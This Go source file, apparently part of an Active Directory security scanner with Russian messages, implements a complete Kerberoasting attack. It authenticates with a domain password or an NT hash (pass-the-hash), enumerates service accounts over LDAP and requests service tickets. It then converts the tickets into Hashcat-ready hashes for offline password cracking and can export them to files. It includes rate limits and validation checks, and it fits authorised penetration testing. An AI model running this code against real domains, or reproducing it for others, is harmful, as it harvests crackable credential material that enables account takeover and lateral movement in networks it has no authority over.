package adscan

import (
	"context"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"fmt"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/go-ldap/ldap/v3"

	"github.com/jcmturner/gokrb5/v8/client"
	"github.com/jcmturner/gokrb5/v8/config"
	"github.com/jcmturner/gokrb5/v8/crypto"
	"github.com/jcmturner/gokrb5/v8/iana/errorcode"
	"github.com/jcmturner/gokrb5/v8/iana/keyusage"
	"github.com/jcmturner/gokrb5/v8/iana/nametype"
	"github.com/jcmturner/gokrb5/v8/iana/patype"
	"github.com/jcmturner/gokrb5/v8/keytab"
	"github.com/jcmturner/gokrb5/v8/messages"
	"github.com/jcmturner/gokrb5/v8/types"
	"wscan/internal/domain"
)

type roastTarget struct {
	User, SPN string
	Machine   bool
}

func normalizeSPNs(values []string, limit int) ([]string, error) {
	out := []string{}
	seen := map[string]bool{}
	for _, value := range values {
		value = strings.TrimSpace(value)
		if value == "" {
			continue
		}
		parts := strings.Split(value, "/")
		if len(value) > 512 || len(parts) < 2 || strings.ContainsAny(value, "@*$\x00\r\n\t ") {
			return nil, fmt.Errorf("некорректный SPN %q", value)
		}
		for _, p := range parts {
			if p == "" {
				return nil, fmt.Errorf("пустая часть SPN")
			}
		}
		if strings.EqualFold(parts[0], "krbtgt") {
			return nil, fmt.Errorf("krbtgt не является сервисом для Kerberoasting")
		}
		k := strings.ToLower(value)
		if seen[k] {
			continue
		}
		seen[k] = true
		if len(out) >= limit {
			return nil, fmt.Errorf("SPN превышают лимит %d", limit)
		}
		out = append(out, value)
	}
	sort.Strings(out)
	return out, nil
}

func kerberoastAccess(ctx context.Context, o AccessOptions) (AccessReport, error) {
	r := AccessReport{Host: o.Host, Mode: "kerberoast"}
	o.Domain = strings.TrimSuffix(strings.ToLower(o.Domain), ".")
	if o.Credential.Username == "" {
		return r, fmt.Errorf("Kerberoasting требует известную доменную учётку")
	}
	spns, err := normalizeSPNs(o.SPNs, o.MaxObjects)
	if err != nil {
		return r, err
	}
	if len(o.TGSEtypes) == 0 {
		o.TGSEtypes = []int32{18, 17, 23}
	}
	for _, e := range o.TGSEtypes {
		if e != 17 && e != 18 && e != 23 {
			return r, fmt.Errorf("TGS etype: только 17,18,23")
		}
	}
	users, err := NormalizeASREPUsers([]string{o.Credential.Username}, o.Domain, 1)
	if err != nil || len(users) != 1 {
		return r, fmt.Errorf("некорректная учётка Kerberos")
	}
	if d := o.Credential.Domain; d != "" && !strings.EqualFold(d, o.Domain) && !strings.EqualFold(d, strings.Split(o.Domain, ".")[0]) {
		return r, fmt.Errorf("учётка относится к другому домену")
	}
	o.Credential.Username = users[0]
	c, closeFn, err := accessLDAP(ctx, o, o.LDAPPort, true)
	if err != nil {
		return r, err
	}
	// RootDSE is authoritative; a NetBIOS realm must not become a BaseDN.
	root, e := c.Search(ldap.NewSearchRequest("", ldap.ScopeBaseObject, ldap.NeverDerefAliases, 1, 4, false, "(objectClass=*)", []string{"defaultNamingContext"}, nil))
	if e != nil {
		closeFn()
		return r, e
	}
	base := ""
	if len(root.Entries) > 0 {
		base = root.Entries[0].GetAttributeValue("defaultNamingContext")
	}
	if base == "" {
		closeFn()
		return r, fmt.Errorf("LDAP defaultNamingContext отсутствует")
	}
	loginEntries, loginErr := accessSearch(ctx, c, base, "(&(objectClass=user)(sAMAccountName="+ldap.EscapeFilter(o.Credential.Username)+"))", []string{"sAMAccountName"}, 2)
	if loginErr != nil || len(loginEntries) != 1 {
		closeFn()
		return r, fmt.Errorf("LDAP не определил единственную учётку Kerberos: %w", errors.Join(loginErr, fmt.Errorf("объектов: %d", len(loginEntries))))
	}
	o.Credential.Username = loginEntries[0].GetAttributeValue("sAMAccountName")
	if o.Credential.Username == "" {
		closeFn()
		return r, fmt.Errorf("LDAP не вернул sAMAccountName учётки")
	}
	entries, searchErr := accessSearch(ctx, c, base, "(&(objectClass=user)(servicePrincipalName=*))", []string{"sAMAccountName", "servicePrincipalName", "userAccountControl", "objectClass"}, o.MaxObjects)
	closeFn()
	if searchErr != nil {
		r.add("kerberoast-ldap", "SPN LDAP", "incomplete", "info", searchErr.Error())
	}
	owners := map[string][]roastTarget{}
	for _, entry := range entries {
		user := entry.GetAttributeValue("sAMAccountName")
		uac, e := strconv.ParseUint(entry.GetAttributeValue("userAccountControl"), 10, 32)
		if e != nil {
			r.add("spn-uac/"+user, "Статус владельца SPN", "incomplete", "info", "userAccountControl отсутствует или повреждён")
			continue
		}
		if user == "" || strings.EqualFold(user, "krbtgt") || uac&2 != 0 {
			continue
		}
		machine := strings.HasSuffix(user, "$") || uac&(2048|4096|8192) != 0
		for _, class := range entry.GetAttributeValues("objectClass") {
			if strings.EqualFold(class, "computer") {
				machine = true
			}
		}
		for _, spn := range entry.GetAttributeValues("servicePrincipalName") {
			if _, e := normalizeSPNs([]string{spn}, 1); e != nil {
				continue
			}
			owners[strings.ToLower(spn)] = append(owners[strings.ToLower(spn)], roastTarget{user, spn, machine})
		}
	}
	var targets []roastTarget
	if len(spns) == 0 {
		for _, v := range owners {
			if len(v) == 1 && !v[0].Machine {
				targets = append(targets, v[0])
			}
		}
	} else {
		for _, spn := range spns {
			v := owners[strings.ToLower(spn)]
			if len(v) != 1 {
				state := "negative"
				if len(v) > 1 || searchErr != nil {
					state = "incomplete"
				}
				r.add("spn/"+spn, "SPN: "+spn, state, "info", "Уникальный активный владелец SPN не найден в полученном каталоге")
				continue
			}
			targets = append(targets, v[0])
		}
	}
	sort.Slice(targets, func(i, j int) bool { return targets[i].SPN < targets[j].SPN })
	if len(targets) > o.MaxObjects {
		targets = targets[:o.MaxObjects]
		r.add("kerberoast-limit", "Лимит SPN", "incomplete", "info", "Список сервисов ограничен")
	}
	r.add("kerberoast-targets", "Активные SPN", "observed", "info", fmt.Sprintf("Выбрано SPN: %d; автоматический список исключает машинные и отключённые учётки", len(targets)))
	if len(targets) == 0 {
		return r, searchErr
	}
	address, err := resolveASREPKDC(ctx, o)
	if err != nil {
		return r, err
	}
	r.Endpoint = "tcp://" + address
	return runKerberoastAt(ctx, address, o, targets, r)
}

// All AS/TGS traffic stays on this one explicit KDC. No referrals, global
// krb5.conf, credential caches, renewal goroutines or password retries.
func runKerberoastAt(ctx context.Context, address string, o AccessOptions, targets []roastTarget, r AccessReport) (AccessReport, error) {
	realm := strings.ToUpper(o.Domain)
	cfg := config.New()
	cfg.LibDefaults.NoAddresses = true
	cfg.LibDefaults.DefaultTktEnctypeIDs = []int32{18, 17, 23}
	cfg.LibDefaults.DefaultTGSEnctypeIDs = o.TGSEtypes
	if o.Credential.Type == "ntlm-hash" {
		cfg.LibDefaults.DefaultTktEnctypeIDs = []int32{23}
	}
	if o.Timeout <= 0 {
		o.Timeout = 5 * time.Second
	}
	if o.RPS <= 0 {
		o.RPS = 2
	}
	var next time.Time
	exchange := func(packet []byte) ([]byte, error) {
		if wait := time.Until(next); wait > 0 {
			timer := time.NewTimer(wait)
			defer timer.Stop()
			select {
			case <-ctx.Done():
				return nil, ctx.Err()
			case <-timer.C:
			}
		}
		next = time.Now().Add(time.Second / time.Duration(o.RPS))
		q, stop := context.WithTimeout(ctx, o.Timeout)
		defer stop()
		return kerberosTCP(q, address, packet)
	}
	tgt, key, err := roastTGT(cfg, realm, o.Credential, exchange)
	if err != nil {
		state := "error"
		var ke messages.KRBError
		if errors.As(err, &ke) {
			state = "denied"
		}
		r.add("kerberoast-auth", "Kerberos TGT", state, "info", err.Error())
		return r, err
	}
	r.add("kerberoast-auth", "Kerberos TGT", "observed", "info", "TGT получен и проверен; ключи и TGT не сохраняются")
	var hashes []string
	finish := func(err error) (AccessReport, error) {
		if len(hashes) > 0 && o.ExportDir != "" {
			path, e := exportKerberosHashes(o.ExportDir, "kerberoast", hashes)
			if e != nil {
				r.add("kerberoast-export", "Экспорт TGS", "error", "info", e.Error())
				err = errors.Join(err, e)
			} else {
				r.Artifacts = append(r.Artifacts, path)
			}
		}
		return r, err
	}
	salts := map[string]string{}
	for _, target := range targets {
		if ctx.Err() != nil {
			return finish(ctx.Err())
		}
		if o.Progress != nil {
			o.Progress("TGS · " + target.User + " · " + target.SPN)
		}
		principal := types.NewPrincipalName(nametype.KRB_NT_PRINCIPAL, o.Credential.Username)
		sname := types.NewPrincipalName(nametype.KRB_NT_SRV_INST, target.SPN)
		req, e := messages.NewTGSReq(principal, realm, cfg, tgt, key, sname, false)
		var rep messages.TGSRep
		if e == nil {
			var packet []byte
			packet, e = req.Marshal()
			if e == nil {
				var reply []byte
				reply, e = exchange(packet)
				if e == nil {
					e = rep.Unmarshal(reply)
				}
			}
		}
		if e == nil {
			e = rep.DecryptEncPart(key)
		}
		if e == nil {
			var ok bool
			ok, e = rep.Verify(cfg, req)
			if !ok && e == nil {
				e = fmt.Errorf("TGS verification failed")
			}
		}
		if e == nil && (rep.PVNO != 5 || rep.Ticket.TktVNO != 5 || !rep.Ticket.SName.Equal(sname) || !rep.DecryptedEncPart.SName.Equal(sname) || !strings.EqualFold(rep.CRealm, realm)) {
			e = fmt.Errorf("TGS отвечает другому сервису/realm; referrals не выполняются")
		}
		saltUser := target.User
		if e == nil && (rep.Ticket.EncPart.EType == 17 || rep.Ticket.EncPart.EType == 18) {
			cacheKey := fmt.Sprintf("%s/%d", target.User, rep.Ticket.EncPart.EType)
			saltUser = salts[cacheKey]
			if saltUser == "" {
				saltUser, e = roastSaltUser(cfg, realm, target.User, rep.Ticket.EncPart.EType, exchange)
				if e == nil {
					salts[cacheKey] = saltUser
				}
			}
		}
		var hash string
		if e == nil {
			hash, e = tgsHash(rep.Ticket, target.User, saltUser)
		}
		if ctx.Err() != nil {
			return finish(ctx.Err())
		}
		if e != nil {
			state := "error"
			var ke messages.KRBError
			if errors.As(e, &ke) {
				state = "denied"
				if ke.ErrorCode == errorcode.KDC_ERR_S_PRINCIPAL_UNKNOWN {
					state = "negative"
				}
			}
			r.add("tgs/"+target.SPN, "TGS: "+target.SPN, state, "info", e.Error())
			continue
		}
		hashes = append(hashes, hash)
		severity := "high"
		if target.Machine {
			severity = "info"
		}
		r.add("tgs/"+target.SPN, "TGS: "+target.SPN, "confirmed", severity, fmt.Sprintf("Владелец %s; etype %d; ciphertext получен и подготовлен для Hashcat. Это не подтверждение слабого пароля; cracking не выполнялся.", target.User, rep.Ticket.EncPart.EType))
		if o.ExportDir == "" {
			r.add("tgs-hash/"+target.SPN, "Hashcat TGS", "observed", "info", hash)
		}
	}
	return finish(nil)
}

func roastTGT(cfg *config.Config, realm string, cred domain.Credential, exchange func([]byte) ([]byte, error)) (messages.Ticket, types.EncryptionKey, error) {
	var empty messages.Ticket
	var zero types.EncryptionKey
	cl := client.NewWithPassword(cred.Username, realm, cred.Secret, cfg, client.DisablePAFXFAST(true))
	if cred.Type == "ntlm-hash" {
		raw, e := hex.DecodeString(cred.Secret)
		if e != nil || len(raw) != 16 {
			return empty, zero, fmt.Errorf("NT hash: 16 байт")
		}
		kt := keytab.New()
		if e = kt.AddEntry(cred.Username, realm, "", time.Now(), 1, 23); e != nil {
			return empty, zero, e
		}
		kt.Entries[0].Key = types.EncryptionKey{KeyType: 23, KeyValue: raw}
		cl = client.NewWithKeytab(cred.Username, realm, kt, cfg, client.DisablePAFXFAST(true))
	}
	defer cl.Destroy()
	req, e := messages.NewASReqForTGT(realm, cfg, cl.Credentials.CName())
	if e != nil {
		return empty, zero, e
	}
	packet, e := req.Marshal()
	if e != nil {
		return empty, zero, e
	}
	reply, e := exchange(packet)
	if e != nil {
		return empty, zero, e
	}
	var rep messages.ASRep
	e = rep.Unmarshal(reply)
	if e != nil {
		var ke messages.KRBError
		if !errors.As(e, &ke) || ke.ErrorCode != errorcode.KDC_ERR_PREAUTH_REQUIRED {
			return empty, zero, e
		}
		if ke.CRealm == "" {
			ke.CRealm = realm
		}
		if len(ke.CName.NameString) == 0 {
			ke.CName = req.ReqBody.CName
		}
		if !strings.EqualFold(ke.CRealm, realm) || len(ke.CName.NameString) != 1 || !strings.EqualFold(ke.CName.NameString[0], cred.Username) {
			return empty, zero, fmt.Errorf("pre-auth относится к другому пользователю/realm")
		}
		chosen, e := roastPreauthEtype(ke, cfg.LibDefaults.DefaultTktEnctypeIDs)
		if e != nil {
			return empty, zero, e
		}
		et, e := crypto.GetEtype(chosen)
		if e != nil {
			return empty, zero, e
		}
		key, kvno, e := cl.Key(et, 0, &ke)
		if e != nil {
			return empty, zero, e
		}
		stamp, e := types.GetPAEncTSEncAsnMarshalled()
		if e != nil {
			return empty, zero, e
		}
		encrypted, e := crypto.GetEncryptedData(stamp, key, keyusage.AS_REQ_PA_ENC_TIMESTAMP, kvno)
		if e != nil {
			return empty, zero, e
		}
		pa, e := encrypted.Marshal()
		if e != nil {
			return empty, zero, e
		}
		req.PAData = append(req.PAData, types.PAData{PADataType: patype.PA_ENC_TIMESTAMP, PADataValue: pa})
		packet, e = req.Marshal()
		if e != nil {
			return empty, zero, e
		}
		reply, e = exchange(packet)
		if e != nil {
			return empty, zero, e
		}
		if e = rep.Unmarshal(reply); e != nil {
			return empty, zero, e
		} // Never retry a rejected password/key.
	}
	if cred.Type == "ntlm-hash" {
		cl.Credentials.Keytab().Entries[0].KVNO = uint32(rep.EncPart.KVNO)
		cl.Credentials.Keytab().Entries[0].KVNO8 = uint8(rep.EncPart.KVNO)
	}
	if e = validatePAIterations(rep.PAData); e != nil {
		return empty, zero, e
	}
	if rep.PVNO != 5 || rep.Ticket.TktVNO != 5 || !strings.EqualFold(rep.Ticket.Realm, realm) || !rep.Ticket.SName.Equal(req.ReqBody.SName) || !containsEtype(cfg.LibDefaults.DefaultTktEnctypeIDs, rep.EncPart.EType) {
		return empty, zero, fmt.Errorf("неверный TGT/etype")
	}
	ok, e := rep.Verify(cfg, cl.Credentials, req)
	if !ok {
		if e == nil {
			e = fmt.Errorf("TGT verification failed")
		}
		return empty, zero, e
	}
	return rep.Ticket, rep.DecryptedEncPart.Key, nil
}

func roastPreauthEtype(ke messages.KRBError, allowed []int32) (int32, error) {
	var pas types.PADataSequence
	if e := pas.Unmarshal(ke.EData); e != nil {
		return 0, e
	}
	if e := validatePAIterations(pas); e != nil {
		return 0, e
	}
	for _, pa := range pas {
		if pa.PADataType == patype.PA_ETYPE_INFO2 {
			info, e := pa.GetETypeInfo2()
			if e != nil {
				return 0, e
			}
			for _, a := range allowed {
				for _, v := range info {
					if v.EType == a {
						return a, nil
					}
				}
			}
		}
	}
	for _, pa := range pas {
		if pa.PADataType == patype.PA_ETYPE_INFO {
			info, e := pa.GetETypeInfo()
			if e != nil {
				return 0, e
			}
			for _, a := range allowed {
				for _, v := range info {
					if v.EType == a {
						return a, nil
					}
				}
			}
		}
	}
	return 0, fmt.Errorf("KDC не объявил поддерживаемый etype для pre-auth")
}

// Bound work controlled by an unauthenticated KDC hint before deriving AES
// keys. Zero means 2^32 iterations in Kerberos, not the default 4096.
func validatePAIterations(pas types.PADataSequence) error {
	for _, pa := range pas {
		if pa.PADataType != patype.PA_ETYPE_INFO2 {
			continue
		}
		info, e := pa.GetETypeInfo2()
		if e != nil {
			return e
		}
		for _, v := range info {
			if v.EType != 17 && v.EType != 18 {
				continue
			}
			if len(v.S2KParams) == 0 {
				continue
			}
			if len(v.S2KParams) != 4 {
				return fmt.Errorf("некорректные AES S2K параметры")
			}
			n := binary.BigEndian.Uint32(v.S2KParams)
			if n == 0 || n > 1000000 {
				return fmt.Errorf("KDC AES iterations превышают предел")
			}
		}
	}
	return nil
}

// Read the real AES salt from a passwordless negotiation, including machine
// principals and accounts renamed since the last password change.
func roastSaltUser(cfg *config.Config, realm, user string, etype int32, exchange func([]byte) ([]byte, error)) (string, error) {
	req, e := messages.NewASReqForTGT(realm, cfg, types.NewPrincipalName(nametype.KRB_NT_PRINCIPAL, user))
	if e != nil {
		return "", e
	}
	req.ReqBody.EType = []int32{etype}
	packet, e := req.Marshal()
	if e != nil {
		return "", e
	}
	reply, e := exchange(packet)
	if e != nil {
		return "", e
	}
	var ke messages.KRBError
	var pas types.PADataSequence
	if e = ke.Unmarshal(reply); e == nil {
		if ke.ErrorCode != errorcode.KDC_ERR_PREAUTH_REQUIRED {
			return "", ke
		}
		if e = pas.Unmarshal(ke.EData); e != nil {
			return "", e
		}
	} else {
		var rep messages.ASRep
		if e = rep.Unmarshal(reply); e != nil {
			return "", e
		}
		pas = rep.PAData
	}
	for _, pa := range pas {
		if pa.PADataType == patype.PA_ETYPE_INFO2 {
			info, e := pa.GetETypeInfo2()
			if e != nil {
				return "", e
			}
			for _, v := range info {
				if v.EType == etype {
					if len(v.S2KParams) > 0 && hex.EncodeToString(v.S2KParams) != "00001000" {
						return "", fmt.Errorf("нестандартные AES iterations; Hashcat export не выполнен")
					}
					if !strings.HasPrefix(v.Salt, realm) || len(v.Salt) <= len(realm) {
						return "", fmt.Errorf("AES salt не представим как REALM+principal")
					}
					return strings.TrimPrefix(v.Salt, realm), nil
				}
			}
		}
	}
	return "", fmt.Errorf("KDC не вернул AES salt владельца SPN")
}

func tgsHash(ticket messages.Ticket, user, saltUser string) (string, error) {
	user = strings.ReplaceAll(user, "$", "%24")
	realm := strings.ToUpper(ticket.Realm)
	spn := ticket.SName.PrincipalNameString()
	cipher := ticket.EncPart.Cipher
	fields := []string{user, realm, spn}
	if ticket.EncPart.EType == 17 || ticket.EncPart.EType == 18 {
		fields = append(fields, saltUser)
	}
	for _, v := range fields {
		if v == "" || len(v) > 512 || strings.ContainsAny(v, "*$\r\n\x00") {
			return "", fmt.Errorf("метаданные не представимы в Hashcat")
		}
	}
	switch ticket.EncPart.EType {
	case 23:
		if len(cipher) < 48 {
			return "", fmt.Errorf("неполный RC4 TGS ciphertext")
		}
		return fmt.Sprintf("$krb5tgs$23$*%s$%s$%s*$%s$%s", user, realm, spn, hex.EncodeToString(cipher[:16]), hex.EncodeToString(cipher[16:])), nil
	case 17, 18:
		if len(cipher) < 44 {
			return "", fmt.Errorf("неполный AES TGS ciphertext")
		}
		return fmt.Sprintf("$krb5tgs$%d$%s$%s$%s$%s", ticket.EncPart.EType, saltUser, realm, hex.EncodeToString(cipher[len(cipher)-12:]), hex.EncodeToString(cipher[:len(cipher)-12])), nil
	default:
		return "", fmt.Errorf("неподдерживаемый TGS etype %d", ticket.EncPart.EType)
	}
}
